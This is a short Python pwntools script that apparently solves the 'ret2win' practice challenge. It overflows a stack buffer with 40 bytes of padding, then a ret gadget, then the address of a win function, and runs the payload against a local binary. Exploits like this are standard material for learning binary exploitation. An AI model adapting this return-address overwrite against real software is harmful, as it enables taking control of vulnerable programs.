#!/usr/bin/env python3
from pwn import *

offset = 40
ret2win = 0x400756
addr_ret_gadget = 0x40053e
payload =  b"A"*offset + p64(addr_ret_gadget) + p64(ret2win)


p = process("./ret2win")
p.sendline(payload)
print(p.recvall(timeout=2).decode(errors='ignore'))
